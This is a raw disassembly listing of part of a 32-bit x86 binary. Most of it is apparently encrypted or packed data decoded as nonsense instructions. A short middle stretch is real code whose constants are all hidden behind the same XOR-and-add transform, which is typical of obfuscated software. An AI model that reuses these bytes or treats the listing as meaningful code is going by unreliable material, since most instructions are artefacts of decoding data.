  426398:	inc    DWORD PTR [esi+edx*8]
  42639b:	rol    ah,1
  42639d:	(bad)  
  42639f:	fmul   QWORD PTR ds:0xf2a9aaea
  4263a5:	shl    esp,0xc5
  4263a8:	rcr    dl,cl
  4263aa:	fcmovnbe st,st(6)
  4263ac:	mov    al,0xe4
  4263ae:	(bad)  
  4263af:	fcom   st(0)
  4263b1:	aad    0xdf
  4263b3:	rcr    ebp,0xd4
  4263b6:	ret    0xd104
  4263b9:	hlt    
  4263ba:	les    eax,FWORD PTR ds:0xea000adf
  4263c0:	clc    
  4263c1:	loopne 0x426392
  4263c3:	rcl    ebx,cl
  4263c5:	out    0xd1,eax
  4263c7:	(bad)  
  4263c9:	into   
  4263ca:	enter  0xdffa,0xf2
  4263ce:	in     eax,0xd5
  4263d0:	call   0xf11c3992
  4263d5:	stc    
  4263d6:	(bad)  
  4263d8:	retf   
  4263d9:	not    ah
  4263db:	retf   
  4263dc:	stc    
  4263dd:	add    al,BYTE PTR [esi]
  4263df:	inc    DWORD PTR [ebx]
  4263e1:	out    0xae,al
  4263e3:	mov    al,0xa8
  4263e5:	jmp    0xb5af:0xd2e8c1af
  4263ec:	mov    eax,0xb5f1fef0
  4263f1:	mov    ebx,0xc201ffd2
  4263f6:	rol    BYTE PTR [edi],1
  4263f8:	fstp   TBYTE PTR [ebp+esi*8+0x5cbf7f0]
  4263ff:	push   cs
  426400:	or     eax,0xd6cfc2c4
  426405:	scas   al,BYTE PTR es:[edi]
  426406:	shl    DWORD PTR [ebx-0xc15083a],cl
  42640c:	mov    edi,0xefbffdda
  426411:	jmp    0xe0e4:0xe1dd01f9
  426418:	repz or eax,ecx
  42641b:	pand   mm1,QWORD PTR [eax]
  42641e:	fimul  WORD PTR [ecx]
  426420:	push   cs
  426421:	retf   
  426422:	rcr    edi,0xc5
  426425:	mov    al,0xd6
  426427:	(bad)  
  426428:	test   eax,0xf7b2c5ce
  42642d:	call   0xca3b370f
  426432:	into   
  426433:	out    dx,eax
  426434:	(bad)  
  426435:	fldlg2 
  426437:	out    0xc5,al
  426439:	shr    edx,0xc0
  42643c:	xlat   BYTE PTR ds:[ebx]
  42643d:	add    bl,ch
  42643f:	add    dl,BYTE PTR [edx]
  426441:	int    0xe8
  426443:	(bad)
  426447:	mov    dh,0xc9
  426449:	icebp  
  42644a:	retf   0xd0cb
  42644d:	not    esp
  42644f:	(bad)  
  426450:	sar    DWORD PTR [eax-0x23ff0b23],cl
  426456:	push   es
  426457:	cld    
  426458:	(bad)  
  426459:	xlat   BYTE PTR ds:[ebx]
  42645a:	fisttp DWORD PTR [eax]
  42645c:	push   cs
  42645d:	or     ebp,ecx
  42645f:	psubusb mm5,mm6
  426462:	retf   
  426463:	jmp    0x42643c
  426465:	(bad)
  426468:	in     eax,0xee
  42646a:	repz shl ah,1
  42646d:	mov    ecx,0xb9c9f4c5
  426472:	in     al,dx
  426473:	idiv   dl
  426475:	mov    edi,0xc106d6f7
  42647a:	ret    0xbddf
  42647d:	shr    cl,0x0
  426480:	into   
  426481:	iret   
  426482:	fucom  st(6)
  426484:	loopne 0x426472
  426486:	enter  0xb2c7,0xe0
  42648a:	cli    
  42648b:	mov    bh,0xc4
  42648d:	retf   0xf4d7
  426490:	sar    DWORD PTR [ebp-0x2220d0d],cl
  426496:	add    eax,ebx
  426498:	cmc    
  426499:	les    ebp,FWORD PTR ds:0x3272fb
  42649f:	xor    eax,0x75108b5
  4264a4:	cmp    eax,0xf89ca5b0
  4264a9:	je     0x42b03e
  4264af:	mov    eax,DWORD PTR [ebp-0x8]
  4264b2:	add    eax,DWORD PTR [ebp-0x80]
  4264b5:	mov    DWORD PTR [ebp-0x84],eax
  4264bb:	mov    eax,DWORD PTR [ebp-0x2c]
  4264be:	sub    eax,DWORD PTR [ebp-0x80]
  4264c1:	mov    DWORD PTR [ebp-0x88],eax
  4264c7:	mov    eax,DWORD PTR [ebp-0x88]
  4264cd:	mov    DWORD PTR [ebp-0x19c],eax
  4264d3:	mov    eax,DWORD PTR [ebp-0x84]
  4264d9:	mov    DWORD PTR [ebp-0x198],eax
  4264df:	mov    DWORD PTR [ebp-0x150],0xf89c85b0
  4264e9:	mov    DWORD PTR [ebp-0x154],0xf89c85b3
  4264f3:	mov    eax,DWORD PTR [ebp-0x150]
  4264f9:	xor    eax,0x75108b5
  4264fe:	add    eax,0x3272fb
  426503:	mov    DWORD PTR [ebp-0x144],eax
  426509:	mov    eax,DWORD PTR [ebp-0x150]
  42650f:	xor    eax,0x75108b5
  426514:	add    eax,0x3272fb
  426519:	mov    DWORD PTR [ebp-0x148],eax
  42651f:	mov    DWORD PTR [ebp-0x14c],0xf89c8590
  426529:	mov    DWORD PTR [ebp-0x158],0xf89c85b9
  426533:	mov    eax,DWORD PTR [ebp-0x19c]
  426539:	mov    ecx,DWORD PTR [ebp-0x150]
  42653f:	xor    ecx,0x75108b5
  426545:	add    ecx,0x3272fb
  42654b:	cmp    eax,ecx
  42654d:	je     0x42b039
  426553:	mov    eax,DWORD PTR [ebp-0x154]
  426559:	xor    eax,0x75108b5
  42655e:	add    eax,0x3272fb
  426563:	mov    ecx,DWORD PTR [ebp-0x144]
  426569:	imul   ecx,eax
  42656c:	mov    eax,DWORD PTR [ebp-0x154]
  426572:	xor    eax,0x75108b5
  426577:	add    eax,0x3272fb
  42657c:	mov    edx,DWORD PTR [ebp-0x19c]
  426582:	sub    edx,eax
  426584:	cmp    ecx,edx
  426586:	ja     0x42b039
  42658c:	mov    eax,DWORD PTR [ebp-0x19c]
  426592:	mov    ecx,DWORD PTR [ebp-0x144]
  426598:	sub    eax,ecx
  42659a:	mov    ecx,DWORD PTR [ebp-0x14c]
  4265a0:	xor    ecx,0x75108b5
  4265a6:	add    ecx,0x3272fb
  4265ac:	xor    edx,edx
  4265ae:	div    ecx
  4265b0:	mov    DWORD PTR [ebp-0x15c],eax
  4265b6:	mov    eax,DWORD PTR [ebp-0x15c]
  4265bc:	mov    ecx,DWORD PTR [ebp-0x158]
  4265c2:	xor    ecx,0x75108b5
  4265c8:	add    ecx,0x3272fb
  4265ce:	cmp    eax,ecx
  4265d0:	jbe    0x4265ec
  4265d6:	mov    eax,DWORD PTR [ebp-0x158]
  4265dc:	xor    eax,0x75108b5
  4265e1:	add    eax,0x3272fb
  4265e6:	mov    DWORD PTR [ebp-0x15c],eax
  4265ec:	mov    eax,DWORD PTR [ebp-0x14c]
  4265f2:	xor    eax,0x75108b5
  4265f7:	add    eax,0x3272fb
  4265fc:	mov    ecx,DWORD PTR [ebp-0x15c]
  426602:	imul   ecx,eax
  426605:	mov    DWORD PTR [ebp-0x148],ecx
  42660b:	mov    eax,DWORD PTR [ebp-0x148]
  426611:	mov    ecx,DWORD PTR [ebp-0x150]
  426617:	xor    ecx,0x75108b5
  42661d:	add    ecx,0x3272fb
  426623:	cmp    eax,ecx
  426625:	je     0x428c70
  42662b:	mov    eax,DWORD PTR [ebp-0x148]
  426631:	mov    DWORD PTR [ebp-0x194],eax
  426637:	mov    eax,DWORD PTR [ebp-0x198]
  42663d:	add    eax,DWORD PTR [ebp-0x144]
  426643:	mov    DWORD PTR [ebp-0x190],eax
  426649:	mov    DWORD PTR [ebp-0x17c],0xf89c85b0
  426653:	mov    DWORD PTR [ebp-0x184],0xf89c85b3
  42665d:	mov    DWORD PTR [ebp-0x170],0xf89c85b2
  426667:	mov    DWORD PTR [ebp-0x16c],0xf89c85bd
  426671:	mov    DWORD PTR [ebp-0x168],0xf89c85b3
  42667b:	mov    eax,DWORD PTR [ebp-0x17c]
  426681:	xor    eax,0x75108b5
  426686:	add    eax,0x3272fb
  42668b:	jmp    0x428a31
  426690:	ffreep st(2)
  426692:	sub    esi,DWORD PTR [esi+esi*1+0x3dd06474]
  426699:	xor    eax,0x75e65692
  42669e:	jg     0x426702
  4266a0:	jae    0x42662b
  4266a2:	jns    0x42671f
  4266a4:	add    bl,BYTE PTR [eax-0x38278485]
  4266aa:	jmp    0x4266ba
  4266ac:	add    al,0x8
  4266ae:	push   cs
  4266af:	(bad)  
  4266b1:	jmp    0x426685
  4266b3:	ret    
  4266b4:	lods   al,BYTE PTR ds:[esi]
  4266b5:	mov    bl,0xcd
  4266b7:	jmp    0xe8d4:0xb0c9e9b5
  4266be:	ret    
  4266bf:	leave  
  4266c0:	push   esp
  4266c2:	(bad)  
  4266c4:	cmc    
  4266c5:	fild   DWORD PTR ds:0xfac2dd0a
  4266cb:	retf   0xdd5
  4266ce:	in     eax,0xcb
  4266d0:	lods   al,BYTE PTR ds:[esi]
  4266d1:	stos   BYTE PTR es:[edi],al
  4266d2:	int    0xb6
  4266d4:	mov    cl,0xe9
  4266d6:	rol    dl,0xf0
  4266d9:	aad    0xf4
  4266db:	jmp    0xf1426693
  4266e0:	mov    edx,0xf5fdc0ee
  4266e5:	(bad)  
  4266e6:	jmp    0x102:0xe7cbbfe7
  4266ed:	std    
  4266ee:	adc    ecx,ebx
  4266f0:	call   0xf2f248d3
  4266f5:	leave  
  4266f6:	retf   
  4266f7:	fucomi st,st(0)
  4266f9:	iret   
  4266fa:	mov    edi,0xcdb6eac8
  4266ff:	mov    al,0xde
  426701:	mov    ecx,0x3d9e101
  426706:	mov    ebp,0xe0cbdac6
  42670b:	hlt    
  42670c:	ret    
  42670d:	int    0xf2
  42670f:	into   
  426710:	jmp    0xf5f35dcd
  426715:	(bad)  
  426716:	rcl    ah,cl
  426718:	aad    0xce
  42671a:	(bad)  
  42671b:	mov    esi,0xf1d1dbce
  426720:	fsub   st,st(2)
  426722:	rcl    ah,0xc2
  426725:	pop    es
  426726:	pop    es
  426727:	or     bl,bh
  426729:	retf   0xc4cb
  42672c:	jmp    0xeed3:0xebecef0b
  426733:	mov    ebp,0xcaacc0e6
  426738:	(bad)  
  426739:	leave  
  42673a:	lods   eax,DWORD PTR ds:[esi]
  42673b:	mov    edx,0x2bbf9ed
  426740:	mov    ebp,0xd0d9cdc3
  426745:	mov    ebp,0xdee8d8e5
  42674a:	clc    
  42674b:	bswap  esi
  42674d:	std    
  42674e:	or     ecx,DWORD PTR [eiz*8-0x504d1e57]
  426755:	in     eax,0xb2
  426757:	mov    bh,0xc6
  426759:	mov    dh,0xc6
  42675b:	sar    esp,cl
  42675d:	mov    esp,0xeebbd1b5
  426762:	mov    ch,0xf8
  426764:	cld    
  426765:	add    al,0xfa
  426767:	pop    es
  426768:	add    dl,bh
  42676a:	rol    esi,0xa
  42676d:	jmp    0xcae8:0xaeeeff08
  426774:	icebp  
  426775:	hlt    
  426776:	aad    0xf6
  426778:	(bad)
  42677b:	mov    bh,0xf3
  42677d:	mov    dl,0xda
  42677f:	jmp    0xf61a2146
  426784:	fadd   QWORD PTR [edi]
  426786:	rcr    ebx,0x1
  426789:	loopne 0x426754
  42678b:	clc    
  42678c:	enter  0xffc8,0xe5
  426790:	test   al,0xaf
  426792:	in     eax,dx
  426793:	fucomp st(5)
  426795:	leave  
  426796:	mov    bh,0xe2
  426798:	stc    
  426799:	int    0xb0
  42679b:	std    
  42679c:	fdiv   st,st(5)
  42679e:	cld    
  42679f:	rcr    ebp,1
  4267a1:	rol    edi,cl
  4267a3:	hlt    
  4267a4:	add    esp,eax
  4267a6:	loopne 0x426778
  4267a8:	rcr    dl,0xd5
  4267ab:	loop   0x426778
  4267ad:	fcmovb st,st(5)
  4267af:	rcl    ecx,cl
  4267b1:	lods   al,BYTE PTR ds:[esi]
  4267b2:	jmp    0xc4b1:0xf6d5bdd3
  4267b9:	test   edx,0xd3f8e9ac
  4267bf:	fbstp  TBYTE PTR [edi-0xe38194a]
  4267c5:	lock retf 
  4267c7:	aam    0xdd
  4267c9:	(bad)  
  4267ca:	in     eax,0xcf
  4267cc:	or     eax,0xb9c9cb0a
  4267d1:	(bad)  
  4267d2:	test   eax,0xcdf6d3b6
  4267d7:	mov    ebx,0xb7d4f5e1
  4267dc:	mov    esi,0xccd1d9f7
  4267e1:	fdivr  st(2),st
  4267e3:	lock ret 
  4267e5:	repz rol DWORD PTR [esi],1
  4267e8:	cli    
  4267e9:	fdivr  st,st(5)
  4267eb:	aam    0xdf
  4267ed:	add    ch,dh
  4267ef:	jecxz  0x4267b2
  4267f1:	(bad)  
  4267f3:	out    dx,eax
  4267f4:	mov    esp,0xecc2f4cd
  4267f9:	(bad)  
  4267fb:	hlt    
  4267fc:	fucomp st(0)
  4267fe:	fdiv   st,st(7)
  426800:	leave  
  426801:	cld    
  426802:	push   es
  426803:	loop   0x4267c5
  426805:	in     al,0xdb
  426807:	(bad)  
  426808:	loopne 0x4267e5
  42680a:	(bad)  
  42680c:	out    0x3,eax
  42680e:	repnz sar BYTE PTR [esi-0x8192313],cl
  426815:	retf   
  426816:	hlt    
  426817:	imul   edx
  426819:	repz mov ch,0xf8
  42681c:	fucomi st,st(4)
  42681e:	mov    ecx,0xe1d8bcf9
  426823:	sar    ch,cl
  426825:	(bad)  
  426826:	(bad)  
  426827:	cli    
  426828:	fldpi  
  42682a:	add    bl,bl
  42682c:	fst    QWORD PTR [ebx]
  42682e:	or     bh,cl
  426830:	icebp  
  426831:	jmp    0xfbc7:0xe7b3d1a5
  426838:	shl    ecx,cl
  42683a:	stc    
  42683b:	(bad)  
  42683d:	in     al,0xd5
  42683f:	int    0x1
  426841:	add    BYTE PTR [ebp-0x25234422],bh
  426847:	loop   0x426850
  426849:	loopne 0x42681f
  42684b:	clc    
  42684c:	or     cl,cl
  42684e:	stc    
  42684f:	or     al,0xe6
  426851:	fmul   st(1),st
  426853:	(bad)  
  426854:	in     al,0xe0
  426856:	into   
  426857:	stc    
  426858:	retf   0xccb8
  42685b:	out    dx,al
  42685c:	call   0xe9fd4b1a
  426861:	aad    0xbf
  426863:	fcomip st,st(1)
  426865:	sar    cl,0xe4
  426868:	(bad)  
  426869:	(bad)  
  42686b:	add    al,0xc3
  42686d:	(bad)  
  42686f:	enter  0xe8f3,0xf7
  426873:	leave  
  426874:	repz in al,dx
  426876:	mov    al,0xc9
  426878:	jmp    0x42685a
  42687a:	out    dx,eax
  42687b:	rcl    ah,cl
  42687d:	fdivr  st(7),st
  42687f:	add    ch,ah
  426881:	aam    0xd0
  426883:	icebp  
  426884:	in     al,dx
  426885:	inc    DWORD PTR [esp+eax*1]
  426888:	faddp  st(1),st
  42688a:	or     dl,ah
  42688c:	loope  0x42689a
  42688e:	in     al,0xe3
  426890:	retf   
  426891:	loopne 0x426884
  426893:	(bad)  
  426894:	jmp    0xf8b9:0xcce7adea
  42689b:	call   0xd426479a
  4268a0:	mov    edx,0xf8cc02f5
  4268a5:	in     eax,0xf1
  4268a7:	std    
  4268a8:	add    eax,0xf9dc05c9
  4268ad:	int    0xea
  4268af:	adc    edx,ebp
  4268b1:	out    dx,eax
  4268b2:	repnz retf 
  4268b4:	xlat   BYTE PTR ds:[ebx]
  4268b5:	leave  
  4268b6:	mov    bh,0xb1
  4268b8:	fcmovbe st,st(7)
  4268ba:	in     eax,dx
  4268bb:	(bad)  
  4268bc:	in     al,dx
  4268bd:	fcomip st,st(0)
  4268bf:	jmp    0xd6dd:0xf4eec1ed
  4268c6:	add    al,0xd1
  4268c8:	or     eax,DWORD PTR [ecx]
  4268ca:	aam    0xee
  4268cc:	pop    es
  4268cd:	ret    0xfd3
  4268d0:	mov    ebp,0xf6ded2e5
  4268d5:	int    0xf2
  4268d7:	ror    ah,cl
  4268d9:	mov    dl,0xd1
  4268db:	(bad)  
  4268dd:	xlat   BYTE PTR ds:[ebx]
  4268de:	mov    ah,0xed
  4268e0:	not    eax
  4268e2:	loope  0x4268a3
  4268e4:	repnz repnz mov ebp,0xbf7f5de
  4268eb:	out    0xf8,al
  4268ed:	pop    es
  4268ee:	cld    
  4268ef:	out    0xf3,eax
  4268f1:	in     al,0xd2
  4268f3:	in     al,dx
  4268f4:	in     eax,dx
  4268f5:	out    0xda,eax
  4268f7:	in     eax,0xf7
  4268f9:	out    0xb8,eax
  4268fb:	inc    esp
  4268fd:	cli    
  4268fe:	fdiv   st,st(5)
  426900:	into   
  426901:	int3   
  426902:	iret   
  426903:	(bad)  
  426904:	xlat   BYTE PTR ds:[ebx]
  426905:	cld    
  426906:	mov    ecx,0x4fccadf
  42690b:	stc    
  42690c:	clc    
  42690d:	or     dh,bl
  42690f:	std    
  426910:	scas   eax,DWORD PTR es:[edi]
  426911:	fadd   st,st(6)
  426913:	repnz rol dl,cl
  426916:	(bad)  
  426917:	mov    cl,0xce
  426919:	int3   
  42691a:	into   
  42691b:	repz mov ah,0xfc
  42691e:	out    dx,eax
  42691f:	in     al,dx
  426920:	repz test ch,0xb4
  426924:	sar    ecx,0xe6
  426927:	(bad)  
  426929:	hlt    
  42692a:	or     bh,ch
  42692c:	retf   0xc10b
  42692f:	adc    bl,bh
  426931:	mov    esi,0xd2d2f7d2
  426936:	in     eax,dx
  426937:	jmp    0x426913
  426939:	(bad)  
  42693a:	mov    cl,0xf0
  42693c:	into   
  42693d:	mov    eax,0xfdbed6ca
  426942:	out    0xe0,al
  426944:	repnz repz push es
  426947:	retf   
  426948:	(bad)  
  42694a:	aad    0xdf
  42694c:	push   es
  42694d:	add    esp,ecx
  42694f:	add    al,0xc4
  426951:	ror    esp,0xcf
  426954:	loop   0x42694b
  426956:	(bad)  
  426957:	shl    ebx,cl
  426959:	cmc    
  42695a:	mov    eax,0xdecdc8b9
  42695f:	enter  0xdbe1,0xd2
  426963:	(bad)  
  426965:	test   BYTE PTR [edi],0xda
  426968:	std    
  426969:	loopne 0x426945
  42696b:	(bad)  
  42696c:	(bad)  
  42696e:	add    eax,0xbceae0cc
  426973:	mov    dl,0xbc
  426975:	mov    cl,0xa9
  426977:	ret    0xdbe0
  42697a:	(bad)  
  42697c:	rcl    ch,1
  42697e:	out    dx,eax
  42697f:	(bad)  
  426980:	in     al,dx
  426981:	ret    0xf2ee
  426984:	in     eax,dx
  426985:	icebp  
  426986:	rol    dl,1
  426988:	neg    ebx
  42698a:	add    cl,BYTE PTR ds:0xf1cfecfc
  426990:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426991:	(bad)
  426994:	out    dx,eax
  426995:	out    0xf6,eax
  426997:	repnz repnz hlt 
  42699a:	into   
  42699b:	leave  
  42699c:	int3   
  42699d:	mov    ebp,0xe1b8e1c9
  4269a2:	cmc    
  4269a3:	int    0xfa
  4269a5:	aam    0xd2
  4269a7:	neg    edi
  4269a9:	ror    BYTE PTR [ecx],0xde
  4269ac:	pop    es
  4269ad:	add    edi,ebp
  4269af:	add    edi,eax
  4269b1:	leave  
  4269b2:	in     al,0xc5
  4269b4:	retf   
  4269b5:	mov    esp,0xd8f7d3d5
  4269ba:	imul   ecx
  4269bc:	xlat   BYTE PTR ds:[ebx]
  4269bd:	mov    ecx,0xd7e2cfcb
  4269c2:	in     al,dx
  4269c3:	(bad)  
  4269c4:	repz mov ebp,0xf708f7db
  4269ca:	hlt    
  4269cb:	clc    
  4269cc:	stc    
  4269cd:	in     eax,0xc5
  4269cf:	shl    bh,cl
  4269d1:	ror    dh,0xe6
  4269d4:	mov    bl,0xb5
  4269d6:	mov    dh,0xc1
  4269d8:	rol    ch,cl
  4269da:	mov    ch,0xee
  4269dc:	(bad)  
  4269dd:	div    BYTE PTR [ebp-0x22063324]
  4269e3:	mov    esi,0xfcdce7e3
  4269e8:	or     bl,cl
  4269ea:	sar    dh,0xc5
  4269ed:	aam    0x2
  4269ef:	out    dx,al
  4269f0:	jecxz  0x4269d2
  4269f2:	mov    dl,0xe7
  4269f4:	mov    al,0xd1
  4269f6:	jmp    0x4269d8
  4269f8:	mov    bh,0xd2
  4269fa:	out    0xea,eax
  4269fc:	mov    bh,0xd5
  4269fe:	hlt    
  4269ff:	int    0xfa
  426a01:	test   edi,0xd3c204f3
  426a07:	hlt    
  426a08:	cli    
  426a09:	test   BYTE PTR [ebx],0x1
  426a0c:	loope  0x4269ee
  426a0e:	out    dx,al
  426a0f:	or     esp,ebp
  426a11:	(bad)  
  426a12:	in     al,0xcd
  426a14:	jmp    0x426a09
  426a16:	in     al,0xe4
  426a18:	in     eax,dx
  426a19:	retf   0xf5d6
  426a1c:	(bad)  
  426a1e:	mov    cl,0xf7
  426a20:	mov    edi,0xd005bdc2
  426a25:	fdivr  st,st(1)
  426a27:	mov    eax,0x401ffc2
  426a2c:	(bad)  
  426a2e:	jmp    0x426a0a
  426a30:	ret    
  426a31:	jecxz  0x4269f9
  426a33:	jecxz  0x4269fe
  426a35:	in     al,0xb4
  426a37:	fcmovne st,st(2)
  426a39:	mov    ah,0xfe
  426a3b:	int3   
  426a3c:	int3   
  426a3d:	fadd   QWORD PTR [ebx]
  426a3f:	rcl    cl,1
  426a41:	cli    
  426a42:	int    0xf1
  426a44:	rcr    al,1
  426a46:	mov    ecx,0xddf5d8db
  426a4b:	add    eax,0x505040e
  426a50:	repz in eax,dx
  426a52:	(bad)  [esi-0x390e4b18]
  426a58:	out    0xce,eax
  426a5a:	clc    
  426a5b:	mov    dh,0xc4
  426a5d:	enter  0x3ba,0xe2
  426a61:	add    ch,bl
  426a63:	loop   0x426a63
  426a65:	loop   0x426a3b
  426a67:	(bad)  
  426a68:	sti    
  426a69:	cli    
  426a6a:	(bad)  [edi]
  426a6c:	cld    
  426a6d:	jmp    0x426a5e
  426a6f:	rcr    ah,0xd2
  426a72:	out    dx,eax
  426a73:	jmp    0xb8b7:0xace1d6f4
  426a7a:	retf   0xf5d0
  426a7d:	std    
  426a7e:	clc    
  426a7f:	mov    ah,0xf1
  426a81:	add    DWORD PTR [ecx],eax
  426a83:	(bad)  
  426a85:	fadd   DWORD PTR ds:0x9f0d4e4
  426a8b:	cmc    
  426a8c:	(bad)  
  426a8d:	(bad)  
  426a8e:	(bad)  
  426a90:	int3   
  426a91:	ret    0xe6b2
  426a94:	mov    dl,0xea
  426a96:	sti    
  426a97:	shr    esp,0xf0
  426a9a:	mov    ah,0xdb
  426a9c:	mov    ah,0xda
  426a9e:	cmc    
  426a9f:	shl    ecx,cl
  426aa1:	mov    esi,0xd5c7f3e2
  426aa6:	jmp    0xf5ea:0xbd06f402
  426aad:	les    eax,FWORD PTR ds:0xe1d7e3ca
  426ab3:	fadd   st(7),st
  426ab5:	jmp    0xcdfb:0xb2c8e5e8
  426abc:	retf   0x2ea
  426abf:	aad    0xe3
  426ac1:	in     al,dx
  426ac2:	mov    esi,0xb9f5fbf3
  426ac7:	(bad)  
  426ac8:	ror    BYTE PTR [ebx],1
  426aca:	neg    edi
  426acc:	cmc    
  426acd:	add    ch,cl
  426acf:	add    edi,ecx
  426ad1:	icebp  
  426ad2:	mov    dl,0xa8
  426ad4:	jmp    0xd8172290
  426ad9:	jmp    0xd7d6:0xf5faace6
  426ae0:	fsubr  st(3),st
  426ae2:	rcr    dl,0xd1
  426ae5:	jecxz  0x426ae8
  426ae7:	aad    0xf0
  426ae9:	loopne 0x426ac2
  426aeb:	hlt    
  426aec:	call   0xcb3d4ce4
  426af1:	(bad)  
  426af2:	loope  0x426aca
  426af4:	in     al,0xd7
  426af6:	cmc    
  426af7:	retf   
  426af8:	out    0xf8,al
  426afa:	jmp    0xd41967f9
  426aff:	cmc    
  426b00:	add    dh,dl
  426b02:	mov    esp,0x6f0e5c0
  426b07:	(bad)  
  426b08:	fiadd  DWORD PTR ds:0xfae9cbc8
  426b0e:	retf   0xcaea
  426b11:	fdiv   st,st(1)
  426b13:	in     al,dx
  426b14:	out    dx,al
  426b15:	shl    BYTE PTR [eax-0xe140f38],0xda
  426b1c:	iret   
  426b1d:	mov    ah,0xef
  426b1f:	fsubr  st(0),st
  426b21:	fcmovnb st,st(2)
  426b23:	xlat   BYTE PTR ds:[ebx]
  426b24:	jecxz  0x426b08
  426b26:	loopne 0x426b25
  426b28:	or     esp,esi
  426b2a:	jmp    0x426b11
  426b2c:	fsubr  st(3),st
  426b2e:	out    0xda,al
  426b30:	in     eax,0xca
  426b32:	lods   al,BYTE PTR ds:[esi]
  426b33:	shl    BYTE PTR [edi-0x244a0824],cl
  426b39:	mov    al,0xd4
  426b3b:	shr    cl,1
  426b3d:	out    dx,eax
  426b3e:	neg    cl
  426b40:	mov    ebp,0xd3ddb5d6
  426b45:	cli    
  426b46:	pop    es
  426b47:	pop    es
  426b48:	aad    0xe7
  426b4a:	or     BYTE PTR [ebx],cl
  426b4c:	in     al,0xdf
  426b4e:	les    eax,FWORD PTR [edx]
  426b50:	leave  
  426b51:	shr    DWORD PTR [edi-0x3a434d1e],0xca
  426b58:	sti    
  426b59:	mov    ch,0xce
  426b5b:	mov    ebx,0xb8ddd4bf
  426b60:	add    edi,edi
  426b62:	fdiv   st,st(6)
  426b64:	int    0xbc
  426b66:	cli    
  426b67:	(bad)  
  426b68:	test   ecx,0xeac6f9d8
  426b6e:	(bad)  
  426b6f:	iret   
  426b70:	scas   eax,DWORD PTR es:[edi]
  426b71:	mov    esi,0xd7e4afb1
  426b76:	loopne 0x426b3f
  426b78:	call   0xfc194732
  426b7d:	repnz repnz (bad) 
  426b81:	clc    
  426b82:	mov    edi,0xbcf3f9c3
  426b87:	loope  0x426b50
  426b89:	fnstcw WORD PTR [ebp+0x2d8c9d8]
  426b8f:	into   
  426b90:	in     eax,dx
  426b91:	scas   eax,DWORD PTR es:[edi]
  426b92:	mov    esi,0xd0e8e1e3
  426b97:	rol    ecx,1
  426b99:	scas   al,BYTE PTR es:[edi]
  426b9a:	sar    al,cl
  426b9c:	mov    ecx,0xeae8ff
  426ba1:	sar    esp,cl
  426ba3:	aad    0xc6
  426ba5:	icebp  
  426ba6:	shl    edi,0xc5
  426ba9:	shl    ch,0xcf
  426bac:	loope  0x426b92
  426bae:	in     eax,0xc8
  426bb0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426bb1:	into   
  426bb2:	(bad)
  426bb5:	fcmovnb st,st(5)
  426bb7:	mov    edx,0xcfbbbaaf
  426bbc:	out    dx,eax
  426bbd:	in     eax,dx
  426bbe:	mov    ecx,0x1d0bafa
  426bc3:	jecxz  0x426b83
  426bc5:	sar    al,1
  426bc7:	shl    edi,1
  426bc9:	mov    esi,0xeee3cbef
  426bce:	stc    
  426bcf:	into   
  426bd0:	mov    cl,0xa9
  426bd2:	(bad)  
  426bd3:	test   al,0xea
  426bd5:	out    0xda,eax
  426bd7:	in     eax,0xec
  426bd9:	out    dx,eax
  426bda:	(bad)  
  426bdc:	iret   
  426bdd:	sti    
  426bde:	jmp    0x426be1
  426be0:	add    esi,ebp
  426be2:	lock ret 
  426be4:	aam    0xc4
  426be6:	jmp    0x426bc8
  426be8:	add    eax,DWORD PTR [ecx]
  426bea:	(bad)  
  426beb:	aam    0xe2
  426bed:	loopne 0x426bfa
  426bef:	retf   
  426bf0:	rcr    eax,1
  426bf2:	rol    ecx,cl
  426bf4:	in     al,dx
  426bf5:	fcmovnbe st,st(5)
  426bf7:	loop   0x426bf4
  426bf9:	(bad)
  426bfc:	sar    bh,cl
  426bfe:	fyl2xp1 
  426c00:	cld    
  426c01:	shl    ecx,0x0
  426c04:	sar    BYTE PTR [esi-0x34252b22],cl
  426c0a:	jmp    0xacfc:0xdbdbc7e7
  426c11:	(bad)  
  426c12:	lock loop 0x426bc4
  426c15:	mov    dl,0xc2
  426c17:	fcmovne st,st(2)
  426c19:	shr    ah,1
  426c1b:	mov    ebx,0xd6baeff8
  426c20:	aad    0xec
  426c22:	ret    
  426c23:	add    bl,bh
  426c25:	push   es
  426c26:	ror    BYTE PTR [ebx],0xca
  426c29:	enter  0xc5d4,0xe8
  426c2d:	(bad)  
  426c2f:	add    ch,BYTE PTR [ebp-0x4d28374d]
  426c35:	xlat   BYTE PTR ds:[ebx]
  426c36:	lods   al,BYTE PTR ds:[esi]
  426c37:	icebp  
  426c38:	out    0xb7,al
  426c3a:	fstp   TBYTE PTR [eax-0x47121549]
  426c40:	repz (bad) 
  426c42:	jecxz  0x426c18
  426c44:	shr    bl,1
  426c46:	lock or eax,esp
  426c49:	clc    
  426c4a:	out    dx,al
  426c4b:	rcl    ch,0x9
  426c4e:	jmp    0xf7e0:0xbdecf3e4
  426c55:	mov    dl,0xc1
  426c57:	shl    BYTE PTR [ebp-0x23303b30],0xe8
  426c5e:	add    bh,BYTE PTR [edx-0x2bfd3f2c]
  426c64:	rcl    ebx,cl
  426c66:	add    al,0xf9
  426c68:	imul   al
  426c6a:	not    ch
  426c6c:	leave  
  426c6d:	jmp    0xc52e4f45
  426c72:	jecxz  0x426c20
  426c74:	out    0xe0,eax
  426c76:	jecxz  0x426c29
  426c78:	into   
  426c79:	jmp    0xbf13337c
  426c7e:	test   cl,0xc3
  426c81:	mov    dh,0xe2
  426c83:	(bad)  
  426c85:	cmc    
  426c86:	idiv   DWORD PTR [eax-0x2028022f]
  426c8c:	fdivr  st,st(4)
  426c8e:	repnz fdivr DWORD PTR [ebp-0x310d4e19]
  426c95:	into   
  426c96:	loop   0x426c59
  426c98:	into   
  426c99:	(bad)  
  426c9a:	icebp  
  426c9b:	retf   
  426c9c:	fucomip st,st(7)
  426c9e:	call   0xe7342e8d
  426ca3:	cli    
  426ca4:	in     al,dx
  426ca5:	hlt    
  426ca6:	lds    ecx,FWORD PTR [ebx]
  426ca8:	mov    edi,0xeffddc
  426cad:	out    dx,al
  426cae:	adc    esi,ecx
  426cb0:	mov    eax,0xe6dccee7
  426cb5:	ror    esp,cl
  426cb7:	jmp    0xc9215f8f
  426cbc:	jmp    0x426c8a
  426cbe:	mov    eax,0xfae1baca
  426cc3:	rcr    cl,1
  426cc5:	rcl    ebp,cl
  426cc7:	jmp    0xcb0a6acb
  426ccc:	out    dx,al
  426ccd:	enter  0xd213,0xbe
  426cd1:	int    0xe9
  426cd3:	ret    0xc5ec
